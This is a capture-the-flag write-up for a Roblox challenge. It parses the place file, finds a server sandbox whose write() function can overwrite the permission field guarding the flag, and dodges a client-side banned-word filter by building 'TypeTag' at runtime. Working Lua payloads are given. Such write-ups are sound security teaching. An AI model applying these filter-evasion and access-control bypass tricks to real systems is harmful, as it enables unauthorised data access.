# World's Hardestest Flag

> **Category**: Pwn / Sandbox Escape (Roblox)
>
> **Flag**: `bronco{d34th_t0_th3_dehs_f0r3v3r}`

> This is Mr. Deh speaking. I've had enough. This. Is. My. Final. Stand.
>
> No more client-sided freebies. No more funny business. Your commands get executed on my special SecureDeh9001Server. You still have freedom (questionable), but I stay safe.
>
> In fact, I'm even building my own server on top of the original game using the Roblox Engine. (Wait, what?)
>
> Also, there's a flag on my super awesome server, but you'll never get it. (I believe in you. Do what it takes to find the flag in the game.)
>
> https://www.roblox.com/games/105471062200103/Worlds-Hardestest-Flag
>
> Note 1: Roblox Player (and a Roblox account) is required for this challenge. Singleplayer, no age verification needed.
>
> Note 2: If you load the game and get stuck on a blank colored screen, reset your character. Keep resetting your character if the screen keeps on being blank.

### Files

* `mrdeh-hardestest.rbxl` — the ripped local copy of the place file (provided by the challenge; **not committed to this repo** for size/licensing reasons, see below)
* `parse_rbxl.py` — standalone binary-.rbxl parser that pulls every `Script`/`LocalScript`/`ModuleScript` source out of the place file without Roblox Studio
* `server_script.lua` — the extracted `ServerScriptService` script containing the vulnerable sandbox (the important one)
* `client_localscript.lua` — the extracted client-side `LocalScript`, containing the terminal UI and its word-filter (also important)
* `payload.lua` — the final exploit payload, ready to paste into the in-game terminal

> **Note:** `mrdeh-hardestest.rbxl` is 178 KB of binary Roblox place data — it's kept locally alongside this writeup but intentionally left out of anything meant to be pushed to a public repo, since it's the challenge author's asset, not something to redistribute. Everything you need to _reproduce_ the finding (the two Lua sources above, the parser) is included and text-diffable.

### Tools

* Python 3 + [`zstandard`](https://pypi.org/project/zstandard/) (binary `.rbxl` chunk decompression — no Roblox Studio needed at all for the static-analysis phase)
* Roblox Player + a Roblox account (only for the final "run it against the live server" step — the account and the actual play session are the one part of this that can't be scripted, since it needs a real login)

### Step 1 — This is a static-analysis + Lua sandbox-escape challenge, not a platformer

The flavor text sounds like a "beat the obby" challenge (three earlier BroncoCTF puzzle-platformers in this series were exactly that), but the actual instructions are explicit: _"Explore the local copy of Mr. Deh's game... then execute your plan in the real game."_ The local `.rbxl` is there so you can read the server logic **before** touching the live server, since the live server is the only thing that actually holds the flag.

### Step 2 — Extracting scripts from the binary `.rbxl`

Roblox's binary place format is a small custom container: an 8-byte magic (`<roblox!`), a 6-byte signature, a version word, then a stream of named chunks (`META`, `SSTR`, `INST`, `PROP`, `PRNT`, `END\0`), each individually zstd-compressed:

```
offset 0   : "<roblox!"                 (8 bytes magic)
offset 8   : 89 FF 0D 0A 1A 0A          (6 bytes signature)
offset 14  : version (u16)
offset 16  : class count / instance count / reserved -> 32-byte header total
offset 32  : first chunk:
                 name            4 bytes  (e.g. "PROP")
                 compressed len  u32
                 uncompressed len u32
                 reserved         u32 (always 0)
                 payload          zstd-compressed if compressed len != 0
```

`PROP` chunks store one property across every instance of a class in one go; the ones we care about have property name `"Source"` — the Luau source of a `Script`, `LocalScript`, or `ModuleScript`:

```
u32 classID
(u32 length + bytes) property name   -> "Source"
u8  type tag                          -> 0x01 (String, in this format revision)
remaining bytes                       -> raw Luau source text
```

`parse_rbxl.py` walks the chunk stream, zstd-decompresses each one, and dumps every `Source` property to its own `.lua` file:

```
$ python parse_rbxl.py mrdeh-hardestest.rbxl ./extracted_sources
[*] parsed 1898 chunks
[+] wrote ./extracted_sources/src_0_classid37.lua (40684 bytes, type tag 0x01)
[+] wrote ./extracted_sources/src_1_classid43.lua (350057 bytes, type tag 0x01)
[+] wrote ./extracted_sources/src_2_classid59.lua (17222 bytes, type tag 0x01)
[*] extracted 3 script source(s)
```

Three scripts came out:

* `classid37` (40 KB) → the big client-side `LocalScript` — movement, tweens, UI, and (critically) the **terminal's word filter**. Copied here as `client_localscript.lua`.
* `classid43` (350 KB) → a vendored **Lua bytecode loader/interpreter** (`Loadstring` ModuleScript) — this is the `execute()` the server uses to compile and run whatever code you submit inside a sandboxed environment.
* `classid59` (17 KB) → the **server-side `ServerScriptService` script**, containing the flag-handling logic. Copied here as `server_script.lua`. This is the whole challenge.

A simple grep across all three pointed straight at the interesting bits:

```
$ grep -ain "flag\|InvokeServer\|OnServerInvoke\|OnServerEvent\|secret\|bronco" *.lua
client_localscript.lua:  local winFunc = game.ReplicatedStorage.WIN
client_localscript.lua:  -- When the server verifies the win, it sends the flag here
client_localscript.lua:  local flag = winFunc:InvokeServer()
client_localscript.lua:  "[BANS] !!! BANNED WORDS BY DEHMASTER: position, humanoid, destroy, name, typetag, flag !!!"
client_localscript.lua:  local bannedWords = {"position", "humanoid", "destroy", "name", "typetag", "flag"} -- why those last 2 ones???
server_script.lua:       -- flag work
server_script.lua:       local FlagStore = DataStoreService:GetDataStore("CTFCredentials")
server_script.lua:       local FLAG = "Bonco{FAKEFAKEFAKE}" -- Fallback for Studio
server_script.lua:       function requestFunction.OnServerInvoke(p)
server_script.lua:       winFunc.OnServerInvoke = function(player)
```

### Step 3 — Reading the server-side sandbox (`server_script.lua`)

The key excerpt (see the full file for context):

```lua
local executeEvent = ReplicatedStorage:WaitForChild("SecureDeh9001Server-Pipeline"):WaitForChild("ExecuteCode")
local execute = require(ReplicatedStorage.Loadstring) -- our code runner
local winFunc = ReplicatedStorage:WaitForChild("WIN")

-- flag work
local FlagStore = DataStoreService:GetDataStore("CTFCredentials")
local FLAG = "Bonco{FAKEFAKEFAKE}" -- Fallback for Studio
local success, live_flag = pcall(function() return FlagStore:GetAsync("TrueFlag") end)
if success and live_flag then FLAG = live_flag end

local function create_player_instance()
    local Storage = {
        [0x6767] = { TypeTag = 0, Value = FLAG },      -- Mr Deh's object: read-protected
        [0x4141] = { TypeTag = 4, Value = "You!" }      -- your object: freely readable
    }

    local function write(address, new_data)
        if Storage[address] then
            for key, val in pairs(new_data) do
                Storage[address][key] = val             -- <-- no field allowlist, no ownership check
            end
        end
    end

    local function read(address)
        local tvalue = Storage[address]
        if not tvalue then return "nil" end
        if tvalue.TypeTag == 0 then return "[ACCESS DENIED]" end   -- <-- only gate on the flag
        return tvalue.Value
    end

    return write, read
end

local function server_execute(player, source_code)
    -- only real check: reject raw compiled Lua bytecode ("\27Lua" signature)
    if type(source_code) ~= "string" or string.sub(source_code, 1, 4) == "\27Lua" then
        player:Kick("... raw bytecode execution is strictly forbidden.")
        return
    end

    local write_mem, read_mem = create_player_instance()   -- <-- fresh Storage every call!

    local custom_env = {
        table = table, write = write_mem, read = read_mem,
        print = function(...) executeEvent:FireClient(player, "SERVER: " .. table.concat(...)) end,
        math = math, string = string, tostring = tostring, tonumber = tonumber,
        type = type, typeof = typeof, pairs = pairs, ipairs = ipairs, unpack = unpack,
        next = next, select = select, pcall = pcall, xpcall = xpcall, error = error, assert = assert
        -- notably absent: os, io, debug, require, game, script, loadstring, getfenv/setfenv...
    }

    local executable, compileFailReason = execute(source_code, custom_env)
    if executable then
        task.spawn(function() pcall(executable) end)
    else
        executeEvent:FireClient(player, "COMPILE ERROR: " .. tostring(compileFailReason))
    end
end

executeEvent.OnServerEvent:Connect(server_execute)

-- haha, nobody is gonna win my game.
winFunc.OnServerInvoke = function(player)
    local retval = server_execute(player, "print(read(0x6767))")
    return text
end
```

So there's an in-game code-execution terminal (`SecureDeh9001Server-Pipeline .ExecuteCode`, wired to `server_execute`): you submit a string of Lua, the server compiles it with a **custom vendored interpreter** (`Loadstring`, that big `classid43.lua` file) inside a **restricted global environment** — no `game`, no `os`/`io`, no `require`, no way to reach outside the sandbox except through two functions it explicitly hands you: `write(address, new_data)` and `read(address)`.

This is a self-contained toy memory model: two objects live in a table keyed by `0x6767` (Mr. Deh's, holding the flag) and `0x4141` (yours). `read()` refuses to return `Storage[0x6767].Value` **only because its `TypeTag` field is `0`**. Nothing else protects it.

**The bug:** `write(address, new_data)` merges _every_ key of `new_data` into `Storage[address]` with **no allowlist and no ownership check** — it never verifies you're only touching your own address, and it never restricts _which fields_ you can overwrite. Since `0x6767` already exists in `Storage`, we can call:

```lua
write(0x6767, { TypeTag = 1 })
```

...and its `TypeTag` flips from `0` to `1`. The very next `read(0x6767)` no longer matches `tvalue.TypeTag == 0`, so it falls through to `return tvalue.Value` — the real flag, straight out of `DataStoreService`.

(The `winFunc.OnServerInvoke` "win" path can never work, by the way — it calls `server_execute` with a _hardcoded_ `"print(read(0x6767))"`, but `create_player_instance()` builds a **brand-new `Storage` table on every single call**, so there's no way to have already flipped the `TypeTag` before that particular invocation runs. It's a red herring / joke ("haha, nobody is gonna win my game"); the real path is straight through the general-purpose terminal.)

### Step 4 — Bypassing the client-side word filter (`client_localscript.lua`)

The in-game terminal UI adds one more obstacle before your code even reaches the server:

```lua
local bannedWords = {"position", "humanoid", "destroy", "name", "typetag", "flag"}

local function containsBannedWords(input)
    for _, word in bannedWords do
        if string.find(string.lower(input), word) then
            return true
        end
    end
    return false
end

submitButton.Activated:Connect(function()
    local code = textEntry.Text
    ...
    if containsBannedWords(code) then
        killPlayer()
        errorLog.Text = "AHA! GOT YOU!!!"
        return
    end
    if code ~= "" then
        executeEvent:FireServer(code)
    end
    ...
end)
```

It's a naive client-side, case-insensitive **substring** match — and it's checked entirely in your browser/game client, so it's trivially bypassable in principle (this is Lua running on your machine; nothing stops you from bypassing the UI entirely and firing the RemoteEvent yourself). But the fun, in-spirit way to solve it is simpler: just avoid typing the literal banned substrings in your source code.

Our payload needs the field name `TypeTag` — whose lowercase form is exactly the banned word `typetag`. Solution: **construct the string at runtime** instead of writing it literally, so the banned substring never appears in the source text you submit:

```lua
local k = string.char(84, 121, 112, 101, 84, 97, 103)  -- spells "TypeTag"
write(0x6767, { [k] = 1 })
print(read(0x6767))
```

(`string.char` is one of the whitelisted globals in `custom_env` — `string` is passed through in full.) None of the other banned words (`flag`, `name`, `position`, `humanoid`, `destroy`) appear anywhere in this payload either.

An equally valid, shorter variant relies on the filter checking the literal source text rather than the _concatenated_ runtime value — `"Type" .. "Tag"` never appears as one contiguous `typetag` substring in what you typed:

```lua
write(0x6767, {["Type".."Tag"]=1}); print(read(0x6767))
```

Both are in `payload.lua`.

### Step 5 — Running it against the live server

1. Launch `https://www.roblox.com/games/105471062200103/Worlds-Hardestest-Flag`, signed in to a Roblox account, and hit **Play**.
2. If you spawn to a blank colored screen (a known quirk called out in the challenge description), **reset your character** — keep resetting until the level actually renders.
3. Open Mr. Deh's in-game terminal (a `>_`-style console icon; text box + Submit button).
4. Paste one of the payload lines from `payload.lua` and hit **Submit**.
5. The overridden `print()` fires the result back to your client, and it lands in the terminal's output/error log as:

```
SERVER: bronco{d34th_t0_th3_dehs_f0r3v3r}
```

If you see `AHA! GOT YOU!!!` and your character dies, a banned word slipped through somewhere — respawn and re-check the payload text character-by-character. If you get `[ACCESS DENIED]` back, the `write()` call didn't actually run (e.g. a typo, or the `TypeTag` key name didn't match what `read()` checks) — the field name must be spelled exactly `TypeTag` (case-sensitive) to line up with the check in `server_script.lua`.

### Flag

```
bronco{d34th_t0_th3_dehs_f0r3v3r}
```

### Summary

| Layer                          | What it looked like it was protecting                            | Why it didn't                                                                                                                                                                 |
| ------------------------------ | ---------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Client word filter             | Stops you from _typing_ `flag`/`typetag`/etc.                    | Purely lexical substring match on the source text you submit — build the string at runtime (`string.char`) or split the substring across a concatenation and it never matches |
| Server bytecode check          | Stops raw compiled Lua bytecode injection                        | Irrelevant to us — we only ever submit plain source text                                                                                                                      |
| Sandboxed `custom_env`         | Stops reaching outside the VM (no `game`, `os`, `io`, `require`) | Irrelevant — the vulnerability is inside the sandbox's own exposed API, not an escape from it                                                                                 |
| `read()`'s `TypeTag == 0` gate | Stops reading the flag object's `Value`                          | `write()` has no allowlist on which fields of which addresses it can touch, so the gate itself can be turned off before reading                                               |

The whole challenge is a single insecure-direct-object-reference-style bug dressed up as a toy "memory read/write" API: a permission check (`TypeTag == 0`) that lives on mutable, attacker-writable data, guarded by an access-control function (`write`) that never checks _who_ is writing or _which_ field they're touching.
